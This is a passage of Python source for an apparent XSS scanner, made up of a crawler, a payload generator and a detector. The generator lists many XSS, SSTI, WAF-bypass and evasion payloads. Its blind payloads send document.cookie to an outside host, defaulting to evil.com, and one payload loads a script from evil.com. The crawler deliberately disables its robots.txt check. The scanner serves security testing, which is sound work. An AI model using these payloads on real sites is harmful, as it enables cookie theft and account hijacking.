                                    self.stats['urls_discovered'] += 1
                                    if self._should_crawl(link):
                                        self.to_crawl.append((link, depth + 1))
                                    else:
                                        self.stats['urls_filtered'] += 1

                    except Exception as e:
                        self.logger.debug(f"Crawl error: {e}")
                        self.stats['errors'] += 1

                    completed.append(future)

                # Remove completed futures
                futures = [f for f in futures if f not in completed]

                # Progress update
                if not self.config.quiet and len(self.visited) % 10 == 0:
                    print(f"{Fore.YELLOW}[*] Progress: {len(self.visited)} pages crawled, {len(self.discovered)} discovered{Style.RESET_ALL}")

        # Final statistics
        if not self.config.quiet:
            print(f"{Fore.GREEN}[✓] Crawling complete: {len(self.discovered)} pages found{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Statistics: {self.stats}{Style.RESET_ALL}")

        return self.discovered

    def _crawl_page(self, url: str, depth: int) -> Optional[PageInfo]:
        """Crawl a single page (thread-safe, policy-correct)"""
        print("Collecting Data.. :", url)

        try:
            # --------------------------------------------------
            # Step 1: Fast duplicate check (thread-safe)
            # --------------------------------------------------
            with self.visited_lock:
                if url in self.visited:
                    self.stats['skipped'] += 1
                    return None

            # --------------------------------------------------
            # Step 2: robots.txt policy check
            # --------------------------------------------------

            #skip these then easy to find hidden truth
            '''if self.robots_rules and not self._check_robots_rules(url):
                self.stats['urls_filtered'] += 1
                self.logger.debug(f"Blocked by robots.txt: {url}")
                return None'''

            # --------------------------------------------------
            # Step 3: Crawl policy checks
            # (domain, subdomain, extensions, danger words, etc.)
            # --------------------------------------------------
            if not self._should_crawl(url):
                self.stats['urls_filtered'] += 1
                self.logger.debug(f"Filtered by crawl rules: {url}")
                return None

            # --------------------------------------------------
            # Step 4: Mark as visited ONLY after passing filters
            # --------------------------------------------------
            with self.visited_lock:
                self.visited[url] = True

            # --------------------------------------------------
            # Step 5: HTTP request
            # --------------------------------------------------
            self.logger.debug(f"Crawling depth {depth}: {url}")
            response = self.client.get(url)

            if not response:
                return None

            if response.status_code != 200:
                self.logger.debug(
                    f"Non-200 response ({response.status_code}) for {url}"
                )
                return None

            #-------------------------
            #-----ONLY FOR html otherwise it generate Collecting Data.. : http://localhost/icon/site.webmanifest
            content_type = response.headers.get("Content-Type", "").lower()

            if "text/html" not in content_type:
                return None

            #------------------------

            # --------------------------------------------------
            # Step 6: Parse page
            # --------------------------------------------------
            page_info = self._parse_page(url, response, depth)
            self.stats['urls_crawled'] += 1

            return page_info

        except Exception as e:
            self.logger.error(f"Failed to crawl {url}: {e}")
            self.stats['errors'] += 1
            return None

    def _parse_page(self, url: str, response: requests.Response, depth: int) -> PageInfo:
        """Parse page content and extract information"""
        soup = BeautifulSoup(response.text, 'html.parser') if BS4_AVAILABLE else None

        # Extract basic info
        content_type = response.headers.get('Content-Type', '')
        content_length = len(response.content)
        content_hash = hashlib.md5(response.content).hexdigest()

        # Extract title
        title = ""
        if soup and soup.title:
            title = soup.title.get_text(strip=True)[:200]

        # Extract forms
        forms = self._extract_forms(soup, url) if soup else []

        # Extract inputs
        inputs = self._extract_inputs(soup) if soup else []

        # Extract links
        links = self._extract_links(soup, url) if soup else []

        # Extract scripts
        scripts = self._extract_scripts(soup) if soup else []

        # Extract iframes
        iframes = self._extract_iframes(soup, url) if soup else []

        # Extract parameters from URL
        parameters = self._extract_parameters(url)

        # Extract security headers
        security_headers = self._extract_security_headers(response.headers)

        # Detect technologies
        technologies = self._detect_technologies(response)

        # Create page info
        page_info = PageInfo(
            url=url,
            status_code=response.status_code,
            content_type=content_type,
            content_length=content_length,
            content_hash=content_hash,
            headers=dict(response.headers),
            cookies=dict(response.cookies),
            html=response.text[:10000],  # Store first 10KB
            title=title,
            forms=forms,
            inputs=inputs,
            links=links,
            scripts=scripts,
            iframes=iframes,
            parameters=parameters,
            security_headers=security_headers,
            technologies=technologies
        )

        return page_info

    def _extract_forms(self, soup: BeautifulSoup, base_url: str) -> List[Dict]:
        """Extract forms from page"""
        forms = []

        for form in soup.find_all('form'):
            form_data = {
                'action': self._make_absolute(form.get('action', ''), base_url),
                'method': form.get('method', 'GET').upper(),
                'enctype': form.get('enctype', 'application/x-www-form-urlencoded'),
                'id': form.get('id', ''),
                'class': form.get('class', []),
                'inputs': [],
                'attributes': dict(form.attrs)
            }

            # Extract all form inputs
            for tag in form.find_all(['input', 'textarea', 'select', 'button']):
                input_data = {
                    'tag': tag.name,
                    'type': tag.get('type', 'text'),
                    'name': tag.get('name', ''),
                    'value': tag.get('value', ''),
                    'id': tag.get('id', ''),
                    'class': tag.get('class', []),
                    'placeholder': tag.get('placeholder', ''),
                    'required': tag.get('required') is not None,
                    'disabled': tag.get('disabled') is not None,
                    'readonly': tag.get('readonly') is not None,
                    'maxlength': tag.get('maxlength'),
                    'minlength': tag.get('minlength'),
                    'pattern': tag.get('pattern'),
                    'attributes': dict(tag.attrs)
                }

                # For select tags, extract options
                if tag.name == 'select':
                    input_data['options'] = []
                    for option in tag.find_all('option'):
                        input_data['options'].append({
                            'value': option.get('value', ''),
                            'text': option.get_text(strip=True),
                            'selected': option.get('selected') is not None
                        })

                form_data['inputs'].append(input_data)

            forms.append(form_data)

        return forms

    def _extract_inputs(self, soup: BeautifulSoup) -> List[Dict]:
        """Extract all input elements from page"""
        inputs = []

        for tag in soup.find_all(['input', 'textarea', 'select']):
            input_data = {
                'tag': tag.name,
                'type': tag.get('type', 'text'),
                'name': tag.get('name', ''),
                'value': tag.get('value', ''),
                'id': tag.get('id', ''),
                'class': tag.get('class', []),
                'placeholder': tag.get('placeholder', ''),
                'required': tag.get('required') is not None,
                'disabled': tag.get('disabled') is not None,
                'readonly': tag.get('readonly') is not None,
                'form': tag.get('form'),
                'autocomplete': tag.get('autocomplete'),
                'attributes': dict(tag.attrs)
            }
            inputs.append(input_data)

        return inputs

    def _extract_links(self, soup: BeautifulSoup, base_url: str) -> List[str]:
        """Extract and filter links from page"""
        links = set()

        # Tags and attributes that contain URLs
        tag_attrs = [
            ('a', 'href'),
            ('link', 'href'),
            ('img', 'src'),
            ('script', 'src'),
            ('iframe', 'src'),
            ('frame', 'src'),
            ('form', 'action'),
            ('area', 'href'),
            ('base', 'href'),
            ('embed', 'src'),
            ('source', 'src'),
            ('track', 'src'),
            ('object', 'data'),
            #('meta', 'content'),  # For refresh, canonical, etc.
        ]

        for tag_name, attr in tag_attrs:
            for tag in soup.find_all(tag_name, {attr: True}):
                url = tag[attr]

                # Skip empty, anchors, and JavaScript
                if not url or url.strip() == '':
                    continue

                if url.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:', 'blob:')):
                    continue

                # Make absolute URL
                try:
                    absolute_url = urlparse.urljoin(base_url, url)

                    # Normalize URL
                    absolute_url = self._normalize_url(absolute_url)

                    # Add to links
                    links.add(absolute_url)

                except Exception as e:
                    self.logger.debug(f"Failed to process URL {url}: {e}")

        return list(links)

    def _extract_scripts(self, soup: BeautifulSoup) -> List[str]:
        """Extract scripts from page"""
        scripts = []

        for script in soup.find_all('script'):
            if script.get('src'):
                scripts.append(f"external:{script['src']}")
            elif script.string:
                # Hash inline scripts to identify duplicates
                content_hash = hashlib.md5(script.string.encode()).hexdigest()[:12]
                scripts.append(f"inline:{content_hash}")

        return scripts

    def _extract_iframes(self, soup: BeautifulSoup, base_url: str) -> List[str]:
        """Extract iframe sources"""
        iframes = []

        for iframe in soup.find_all('iframe', {'src': True}):
            src = iframe['src']
            if src and not src.startswith(('javascript:', 'data:')):
                absolute_src = urlparse.urljoin(base_url, src)
                iframes.append(absolute_src)

        return iframes

    def _extract_parameters(self, url: str) -> List[Dict]:
        """Extract parameters from URL"""
        parameters = []

        try:
            parsed = urlparse.urlparse(url)

            # Query parameters
            query_params = urlparse.parse_qs(parsed.query, keep_blank_values=True)
            for param, values in query_params.items():
                parameters.append({
                    'name': param,
                    'value': values[0] if values else '',
                    'location': 'query',
                    'multiple': len(values) > 1
                })

            # Fragment parameters
            if parsed.fragment and '=' in parsed.fragment:
                fragment_params = urlparse.parse_qs(parsed.fragment, keep_blank_values=True)
                for param, values in fragment_params.items():
                    parameters.append({
                        'name': param,
                        'value': values[0] if values else '',
                        'location': 'fragment',
                        'multiple': len(values) > 1
                    })

            # Path parameters (REST style)
            if parsed.path:
                path_parts = parsed.path.split('/')
                for i, part in enumerate(path_parts):
                    if part and any(c.isdigit() for c in part):
                        parameters.append({
                            'name': f'path_{i}',
                            'value': part,
                            'location': 'path',
                            'multiple': False
                        })

        except Exception as e:
            self.logger.debug(f"Failed to extract parameters from {url}: {e}")

        return parameters

    def _extract_security_headers(self, headers: Dict) -> Dict[str, str]:
        """Extract security-related headers"""
        security_headers = {}

        security_header_names = [
            'Content-Security-Policy',
            'Strict-Transport-Security',
            'X-Frame-Options',
            'X-Content-Type-Options',
            'X-XSS-Protection',
            'Referrer-Policy',
            'Permissions-Policy',
            'Expect-CT',
            'Feature-Policy',
        ]

        for header in security_header_names:
            if header in headers:
                security_headers[header] = headers[header]

        return security_headers

    def _detect_technologies(self, response: requests.Response) -> List[str]:
        """Detect technologies used by the application"""
        technologies = []

        # Detect from headers
        server = response.headers.get('Server', '')
        if server:
            technologies.append(f"Server: {server}")

        x_powered = response.headers.get('X-Powered-By', '')
        if x_powered:
            technologies.append(f"PoweredBy: {x_powered}")

        x_generator = response.headers.get('X-Generator', '')
        if x_generator:
            technologies.append(f"Generator: {x_generator}")

        # Detect from content
        content = response.text[:5000]  # First 5KB

        # CMS detection
        cms_patterns = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Joomla': ['joomla', 'com_content'],
            'Drupal': ['drupal', 'sites/all'],
            'Magento': ['magento', '/static/version'],
            'Shopify': ['shopify', 'cdn.shopify.com'],
            'Wix': ['wix', 'static.parastorage.com'],
            'Squarespace': ['squarespace'],
        }

        for cms, patterns in cms_patterns.items():
            if any(pattern.lower() in content.lower() for pattern in patterns):
                technologies.append(f"CMS: {cms}")
                break

        # Framework detection
        framework_patterns = {
            "Angular": [
                "ng-app",
                "ng-controller",
                "ng-version",
                "ng-bind",
                "ng-model",
                "<app-root",
                "angular.js",
                "angular.min.js",
            ],
            "React": [
                "data-reactroot",
                "data-reactid",
                "__react_devtools_global_hook__",
                "react.production.min.js",
                "react.development.js",
            ],
            "Vue": [
                "data-v-",
                "__vue_devtools_global_hook__",
                "vue.runtime",
                "vue.global",
                "v-bind:",
                "v-if=",
                "v-for=",
            ],
            "jQuery": [
                "jquery.js",
                "jquery.min.js",
                "$.ajax(",
                "$(document).ready",
            ],
            "Bootstrap": [
                "bootstrap.min.css",
                "bootstrap.min.js",
            ],
            "Tailwind": [
                "tailwindcss",
            ],
        }

        for framework, patterns in framework_patterns.items():
            if any(pattern.lower() in content.lower() for pattern in patterns):
                technologies.append(f"Framework: {framework}")

        # Backend detection
        backend_patterns = {
            'PHP': ['.php', 'PHPSESSID'],
            'ASP.NET': ['.aspx', 'ASP.NET'],
            'Java': ['.jsp', 'JSESSIONID'],
            'Python': ['.py', 'django', 'flask'],
            'Ruby': ['.rb', 'rails', '_session_id'],
            'Node.js': ['node', 'express'],
        }

        for backend, patterns in backend_patterns.items():
            if any(pattern.lower() in content.lower() for pattern in patterns):
                technologies.append(f"Backend: {backend}")

        # Web server detection
        if 'nginx' in server.lower():
            technologies.append("WebServer: nginx")
        elif 'apache' in server.lower():
            technologies.append("WebServer: Apache")
        elif 'iis' in server.lower():
            technologies.append("WebServer: IIS")

        return list(set(technologies))

    def _should_crawl(self, url: str) -> bool:
        """Check if URL should be crawled"""
        if not url:
            return False

        # Check if already visited or in queue
        if url in self.visited:
            return False

        # Check if in queue
        for queued_url, _ in self.to_crawl:
            if url == queued_url:
                self.stats['skipped'] += 1
                return False

        # Check domain restrictions
        if not self._is_allowed_domain(url):
            return False

        # Check file extensions
        if self._is_static_file(url):
            return False

        # Check URL length
        if len(url) > 2000:
            return False

        # Check for dangerous patterns
        dangerous_patterns = [
            '/logout',
            '/delete',
            '/remove',
            '/destroy',
            '/shutdown',
            '/exit',
            '/kill',
        ]
        '''dangerous_patterns = [
            'logout',
            'delete',
            'remove',
            'destroy',
            'shutdown',
            'exit',
            'kill',
        ]
        '''
        #=================
        #changes
        #================
        parsed = urlparse.urlparse(url)
        path = parsed.path.lower()
        #===========

        '''if any(pattern in url.lower() for pattern in dangerous_patterns):
            return False'''
        #==============
        if any(path.startswith(p) for p in dangerous_patterns):
            return False
        #======================

        return True

    def _is_allowed_domain(self, url: str) -> bool:
        try:
            parsed = urlparse.urlparse(url)
            hostname = parsed.hostname

            if not hostname:
                return False

            # Localhost / IP
            if hostname in ("localhost", "127.0.0.1", "0.0.0.0") or self._is_ip_address(hostname):
                return hostname in self.allowed_domains

            # Extract registrable domain
            extracted = tldextract.extract(hostname)
            registrable = f"{extracted.domain}.{extracted.suffix}"

            # Exact match
            if registrable in self.allowed_domains:
                return True

            # Subdomain match
            if self.config.crawl_subdomains:
                for allowed in self.allowed_domains:
                    if allowed.startswith("*."):
                        base = allowed[2:]
                        if hostname.endswith("." + base):
                            return True

            return False

        except Exception:
            return False

    def _is_valid_url(self, url: str) -> bool:
        try:
            parsed = urlparse.urlparse(url)

            if parsed.scheme not in ("http", "https"):
                return False

            if not parsed.hostname:
                return False

            return self._is_allowed_domain(url)

        except Exception:
            return False

    def _is_static_file(self, url: str) -> bool:
        """Check if URL points to static file"""
        parsed = urlparse.urlparse(url)
        if parsed.netloc in ['localhost', '127.0.0.1']:
            # Only filter obvious static files for localhost
            static_extensions = [
                '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico',
                '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.mp3',
                '.pdf', '.zip', '.tar', '.gz'
            ]

            url_lower = url.lower()
            if any(url_lower.endswith(ext) for ext in static_extensions):
                return True

            return False


        static_extensions = [
            # Images
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.svg', '.ico', '.webp',
            # Styles
            '.css', '.scss', '.sass', '.less',
            # Scripts
            '.js', '.mjs', '.cjs',
            # Fonts
            '.woff', '.woff2', '.ttf', '.eot', '.otf',
            # Media
            '.mp4', '.mp3', '.avi', '.mov', '.wmv', '.flv', '.mkv', '.webm',
            '.wav', '.ogg', '.m4a',
            # Documents
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf',
            # Archives
            '.zip', '.rar', '.tar', '.gz', '.7z', '.bz2',
            # Executables
            '.exe', '.dmg', '.pkg', '.deb', '.rpm', '.msi',
            # Other
            '.xml', '.json', '.csv', '.swf', '.fla'
        ]

        # Check extension
        url_lower = url.lower()
        if any(url_lower.endswith(ext) for ext in static_extensions):
            return True

        # Check common static paths
        static_paths = [
            '/static/', '/assets/', '/images/', '/img/', '/css/', '/js/',
            '/fonts/', '/media/', '/uploads/', '/downloads/', '/files/',
        ]

        if any(path in url for path in static_paths):
            return True

        return False

    def _check_robots_rules(self, url: str) -> bool:
        """Check if URL is allowed by robots.txt"""
        if not self.robots_rules:
            return True

        parsed = urlparse.urlparse(url)
        path = parsed.path

        # Check disallow rules first
        for rule in self.robots_rules.get('disallow', []):
            if rule and path.startswith(rule):
                return False

        # Check allow rules
        for rule in self.robots_rules.get('allow', []):
            if rule and path.startswith(rule):
                return True

        return True

    def _make_absolute(self, url: str, base_url: str) -> str:
        """Convert relative URL to absolute"""
        if not url:
            return base_url

        if url.startswith(('http://', 'https://')):
            return url

        return urlparse.urljoin(base_url, url)

    def _normalize_url(self, url: str) -> str:
        """Normalize URL by removing fragments and sorting parameters"""
        try:
            parsed = urlparse.urlparse(url)

            # Remove fragment
            parsed = parsed._replace(fragment='')

            # Sort query parameters
            if parsed.query:
                query_params = urlparse.parse_qs(parsed.query, keep_blank_values=True)
                # Sort by parameter name
                sorted_params = sorted(query_params.items(), key=lambda x: x[0])
                # Rebuild query string
                sorted_query = urlparse.urlencode(sorted_params, doseq=True)
                parsed = parsed._replace(query=sorted_query)

            return parsed.geturl()

        except Exception:
            return url




# ============================================================================
# ADVANCED PAYLOAD GENERATOR
# ============================================================================

class ProfessionalPayloadGenerator:
    """Advanced payload generator with context awareness"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.logger = logging.getLogger(f"{config.scanner_name}.PayloadGenerator")

        # Load payload libraries
        self.payloads = self._load_payload_libraries()

        # Context patterns
        self.context_patterns = self._build_context_patterns()

        # Evasion techniques
        self.evasion_techniques = self._build_evasion_techniques()

        # Load custom payloads if provided
        if config.custom_payload_file and os.path.exists(config.custom_payload_file):
            self._load_custom_payloads(config.custom_payload_file)

    def _load_payload_libraries(self) -> Dict[str, List[str]]:
        """Load comprehensive payload libraries"""

        # Basic payloads (always included)
        basic = [
            # Script tags
            '<script>alert(1)</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(window.location)</script>',

            # Event handlers
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',

            # HTML tags
            '<a href="javascript:alert(1)">click</a>',
            '<details open ontoggle=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',

            # Form-based
            '<input onfocus=alert(1) autofocus>',
            '<form><button formaction=javascript:alert(1)>X</button></form>',
        ]

        # Evasion payloads
        evasion = [
            # Tag splitting
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<img src=x oneonerrorrror=alert(1)>',

            # Case variation
            '<ScRiPt>alert(1)</ScRiPt>',
            '<IMG SRC=X ONERROR=alert(1)>',

            # Encoding
            '<img src=x onerror=alert&#40;1&#41;>',
            '<img src=x onerror=alert&#x28;1&#x29;>',

            # JavaScript obfuscation
            '<img src=x onerror=alert`1`>',
            '<img src=x onerror=alert.call(null,1)>',
            '<img src=x onerror=alert.bind(null)(1)>',
            '<img src=x onerror=(alert)(1)>',
            '<img src=x onerror=window["al"+"ert"](1)>',
            '<img src=x onerror=self["al"+"ert"](1)>',

            # Unicode
            '<img src=x onerror=al\u0065rt(1)>',
            '<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>',

            # Comments
            '<img src=x onerror=alert(1)//',
            '"><!--<img src=x onerror=alert(1)>-->',

            # Null bytes
            '<img src=x onerror=alert(1)\0>',
            '<img src=\0x onerror=alert(1)>',
        ]

        # Polyglot payloads (work in multiple contexts)
        polyglot = [
            # Famous polyglot
            'jaVasCript:/*-/*`/*\\`/*\\\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e',

            # HTML/JavaScript polyglot
            '\'">><marquee><img src=x onerror=confirm(1)></marquee>">',

            # Multiple context polyglot
            '</plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(1) type=submit>',

            # CSP bypass polyglot
            '-->\'"/></sCript><svG x=">" onload=(co\\u006efirm)``>',
        ]

        # DOM-based payloads
        dom = [
            # Hash-based
            "#<img src=x onerror=alert('{{MARKER}}')>",
            "#javascript:alert('{{MARKER}}')",

            # URL parameter based
            "?xss=<img src=x onerror=alert('{{MARKER}}')>",
            "?xss=javascript:alert('{{MARKER}}')",

            # Data URLs
            "data:text/html,<script>alert('{{MARKER}}')</script>",
        ]

        # Blind XSS payloads
        blind = [
            '<script>fetch("http://{domain}/?c="+document.cookie)</script>',
            '<img src=x onerror="new Image().src=\'http://{domain}/?data=\'+btoa(document.cookie)">',
            '<script>new Image().src="http://{domain}/?domain="+document.domain</script>',
            '<link rel=ping href="http://{domain}/">',
            '<script>navigator.sendBeacon("http://{domain}/", document.cookie)</script>',
            '<iframe src="http://{domain}/"></iframe>',
        ]

        # JSON payloads
        json_payloads = [
            '{"test":"<script>alert(1)</script>"}',
            '{"data":"\"><script>alert(1)</script>"}',
            '{"input":"\'onfocus=alert(1) autofocus\'"}',
            '{"payload":"javascript:alert(1)"}',
            '{"xss":${alert(1)}}',
        ]

        # Framework-specific payloads
        framework_specific = {
            'React': [
                '<img src={alert(1)}>',
                '{alert(1)}',
                '{`${alert(1)}`}',
                '{(function(){alert(1)})()}',
                '{{constructor.constructor("alert(1)")()}}',
            ],
            'AngularJS': [
                '{{constructor.constructor("alert(1)")()}}',
                '{{$eval.constructor("alert(1)")()}}',
                '{{a="constructor";b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].__proto__,a).value,0,"alert(1)")()}}',
            ],
            'Vue.js': [
                '{{_c.constructor("alert(1)")()}}',
                '<div v-html="<img src=x onerror=alert(1)>"></div>',
            ],
            'jQuery': [
                '<img src=x onerror=$.getScript("//evil.com/xss.js")>',
                '<img src=x onerror=$(document.body).html("<script>alert(1)</script>")>',
            ]
        }

        # WAF bypass payloads
        waf_bypass = [
            '<script>prompt`1`</script>',
            '<script>confirm`1`</script>',
            '<script>print`1`</script>',
            '<svg><script>alert&#40;1&#41</script>',
            '<<script>alert(1);//<</script>',
            '<iframe srcdoc="<script>alert(1)</script>">',
            '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
            '<marquee><img src=x onerror=alert(1)></marquee>',
            '<image src=1 href=1 onerror=alert(1)>',
            '<table background="javascript:alert(1)"></table>',
        ]

        # SSTI payloads
        ssti = [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '${{7*7}}',
            '@(7*7)',
            '#{7*7}',
        ]
        stored=[
            '<script>ls</script>',
            'jaVasCript:/*-/*`/*\\`/*\\\'/*"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e',
            '<<>',
            '/><>\\<>',

        ]

        return {
            'basic': basic,
            'evasion': evasion,
            'polyglot': polyglot,
            'dom': dom,
            'blind': blind,
            'json': json_payloads,
            'framework': framework_specific,
            'waf_bypass': waf_bypass,
            'ssti': ssti,
            'stored':stored,
        }

    def _build_context_patterns(self) -> Dict[str, List[str]]:
        """Build patterns for context detection"""
        return {
            'html_tag': [r'<[^>]*>', r'&lt;[^&]*&gt;'],
            'html_attribute': [r'[\'"]', r'`'],
            'javascript': [r'<script>', r'javascript:', r'on\w+\s*='],
            'css': [r'style\s*=', r'<style>'],
            'url': [r'href\s*=', r'src\s*=', r'action\s*='],
            'json': [r'\{.*\}', r'\[.*\]', r'application/json'],
            'comment': [r'<!--.*?-->'],
        }

    def _build_evasion_techniques(self) -> List[Callable[[str], str]]:
        """Build evasion techniques"""
        techniques = [
            # HTML encoding
            lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),
            lambda p: p.replace('<', '&#60;').replace('>', '&#62;'),
            lambda p: p.replace('<', '&#x3c;').replace('>', '&#x3e;'),

            # URL encoding
            lambda p: urlparse.quote(p),
            lambda p: urlparse.quote_plus(p),

            # Unicode
            lambda p: p.replace('a', '\\u0061').replace('l', '\\u006c').replace('e', '\\u0065').replace('r', '\\u0072').replace('t', '\\u0074'),

            # Case variation
            lambda p: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),

            # Null byte injection
            lambda p: p.replace('<', '<\\0'),
            lambda p: p.replace('>', '\\0>'),

            # Comment injection
            lambda p: p.replace('<script>', '<scr<!---->ipt>'),
            lambda p: p.replace('onerror', 'on<!---->error'),

            # Tab/newline injection
            lambda p: p.replace('=', '=\\t'),
            lambda p: p.replace('>', '\\n>'),

            # Double encoding
            lambda p: urlparse.quote(urlparse.quote(p)),

            # Base64 encoding
            lambda p: f"data:text/html;base64,{base64.b64encode(p.encode()).decode()}",
        ]
        return techniques

    def _load_custom_payloads(self, filepath: str):
        """Load custom payloads from file"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read().strip()

                # Try JSON first
                try:
                    custom_payloads = json.loads(content)
                    if isinstance(custom_payloads, dict):
                        self.payloads.update(custom_payloads)
                    elif isinstance(custom_payloads, list):
                        self.payloads['custom'] = custom_payloads
                except json.JSONDecodeError:
                    # Treat as text file with one payload per line
                    lines = [line.strip() for line in content.split('\n') if line.strip()]
                    self.payloads['custom'] = lines

                self.logger.info(f"Loaded {len(self.payloads.get('custom', []))} custom payloads from {filepath}")

        except Exception as e:
            self.logger.error(f"Failed to load custom payloads from {filepath}: {e}")


    def get_payloads(self, context: str = 'generic', frameworks: List[str] = None,
                     evasion_level: int = 1, count: int = None) -> List[str]:
        """Get payloads for specific context and requirements"""
        payloads = []

        # Get base payloads based on context
        if context == 'generic' or context == 'reflected':
            payloads.extend(self.payloads['basic'])
            if evasion_level >= 1:
                payloads.extend(self.payloads['evasion'][:10])
            if evasion_level >= 2:
                payloads.extend(self.payloads['polyglot'][:3])
                payloads.extend(self.payloads['waf_bypass'][:5])

        elif context == 'dom':
            payloads.extend(self.payloads['dom'])


        elif context == 'blind':
            # Replace domain placeholder with actual domain
            domain = self.config.oob_domain if self.config.use_oob else "evil.com"
            blind_payloads = [p.format(domain=domain) for p in self.payloads['blind']]
            payloads.extend(blind_payloads)

        elif context == 'json':
            payloads.extend(self.payloads['json'])

        elif context == 'ssti':
            payloads.extend(self.payloads['ssti'])
        elif context == 'stored':
            payloads.extend(self.payloads['stored'])

        # Add framework-specific payloads
        if frameworks:
            for framework in frameworks:
                if framework in self.payloads['framework']:
                    payloads.extend(self.payloads['framework'][framework])
                    '''framework_payloads = self.payloads['framework'].get(framework)
                    if isinstance(framework_payloads, list):
                        payloads.extend(framework_payloads)
                    elif isinstance(framework_payloads, str):
                        payloads.append(framework_payloads)'''

        # Apply evasion techniques if requested
        if evasion_level >= 3 and context != 'dom' :
            original_count = len(payloads)
            for payload in payloads[:original_count]:  # Avoid infinite loop
                for technique in self.evasion_techniques[:3]:
                    try:
                        evaded = technique(payload)
                        if evaded != payload:
                            payloads.append(evaded)
                    except:
                        pass

        # Remove duplicates
        unique_payloads = list(OrderedDict.fromkeys(payloads))

        # Limit count
        if count:
            unique_payloads = unique_payloads[:count]
        else:
            unique_payloads = unique_payloads[:self.config.max_payloads_per_param]

        return unique_payloads

    def generate_context_aware_payload(self, target_text: str, position: int) -> List[str]:
        """Generate payloads that fit into the context at a specific position"""
        payloads = []

        # Analyze context around position
        context_start = max(0, position - 50)
        context_end = min(len(target_text), position + 50)
        context = target_text[context_start:context_end]

        # Determine context type
        context_type = self._detect_context_type(context, position - context_start)

        # Generate appropriate payloads
        if context_type == 'html_tag':
            payloads.extend([
                '><script>alert(1)</script>',
                '" onmouseover=alert(1) ',
                '\' onfocus=alert(1) autofocus ',
            ])
        elif context_type == 'html_attribute':
            payloads.extend([
                '" onmouseover=alert(1) x="',
                '\' onfocus=alert(1) autofocus \'',
                '` onload=alert(1) `',
            ])
        elif context_type == 'javascript':
            payloads.extend([
                '";alert(1);//',
                '\';alert(1);//',
                '`;alert(1);//',
                '\\";alert(1);//',
            ])
        elif context_type == 'css':
            payloads.extend([
                ';color:expression(alert(1));',
                '}{color:expression(alert(1))}',
            ])

        return payloads

    def _detect_context_type(self, text: str, position: int) -> str:
        """Detect the context type at a given position"""
        # Check for HTML tags
        if re.search(r'<[^>]*$', text[:position]):
            return 'html_tag'

        # Check for attribute values
        if re.search(r'=\s*[\'"]', text[:position]):
            return 'html_attribute'

        # Check for JavaScript
        if '<script>' in text.lower() or 'javascript:' in text.lower():
            return 'javascript'

        # Check for CSS
        if 'style=' in text.lower() or '<style>' in text.lower():
            return 'css'

        return 'text'

# ============================================================================
# ADVANCED XSS DETECTOR
# ============================================================================

class ProfessionalXSSDetector:
    """Advanced XSS detection engine"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.logger = logging.getLogger(f"{config.scanner_name}.Detector")

        # Components
        self.http_client = AdvancedHTTPClient(config)
        self.payload_generator = ProfessionalPayloadGenerator(config)
        self.crawler = ProfessionalCrawler(self.http_client, config)

        # Browser manager
        self.browser_manager = None
        if config.use_browser and SELENIUM_AVAILABLE:
            self.browser_manager = BrowserManager(config)

        # JavaScript analyzer
        self.js_analyzer = None
        if config.analyze_js_ast:
            self.js_analyzer = JavaScriptAnalyzer(config)

        # OOB server
        self.oob_server = None
        if config.use_oob:
            self.oob_server = OOBServer(config)

        # Vulnerability tracker
        self.vulnerabilities = []
        self.verified_vulnerabilities = []

        # Statistics
        self.stats = {
            'pages_scanned': 0,
            'payloads_sent': 0,
            'reflections_found': 0,
            'potential_xss': 0,
            'verified_xss': 0,
        }

    def scan(self) -> ScanResult:
        """Execute complete XSS scan"""
        scan_start = datetime.now()

        if not self.config.quiet:
            print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}PROFESSIONAL XSS SCANNER - Starting Scan{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Target: {self.config.target_url}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Scan ID: {self.config.scan_id}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}\n")

        try:
            # Phase 1: Discovery
            if not self.config.quiet:
                print(f"{Fore.YELLOW}[*] Phase 1: Discovery & Crawling{Style.RESET_ALL}")

            pages = self.crawler.crawl(self.config.target_url)
            self.stats['pages_scanned'] = len(pages)

            if not pages:
                if not self.config.quiet:
                    print(f"{Fore.RED}[!] No pages found to scan{Style.RESET_ALL}")
                return self._create_empty_result(scan_start)

            # Phase 2: Technology Detection
            if not self.config.quiet:
                print(f"{Fore.YELLOW}[*] Phase 2: Technology Detection{Style.RESET_ALL}")

            technologies = self._detect_technologies(pages)
            frameworks = technologies.get('frameworks', [])

            # Phase 3: Reflected XSS
            if self.config.scan_reflected:
                if not self.config.quiet:
                    print(f"{Fore.YELLOW}[*] Phase 3: Reflected XSS Scanning{Style.RESET_ALL}")

